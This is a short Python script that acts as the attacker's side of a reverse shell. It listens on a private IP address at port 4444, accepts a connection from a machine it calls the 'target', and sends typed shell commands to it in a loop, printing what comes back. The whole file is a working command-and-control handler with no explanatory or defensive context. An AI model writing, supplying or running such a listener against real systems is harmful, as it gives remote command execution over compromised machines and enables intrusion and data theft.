import socket
import json
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('192.168.18.242',4444))
s.listen(4)
print('[*] Connecting')
target, ip = s.accept()
print('[+] Connected',ip)
while True:
        command = input('<Shell>')
        target.send(json.dumps(command).encode())
        if command == 'quit':
                break
        else:
                result = json.loads(target.recv(65000).decode())
                print(result)

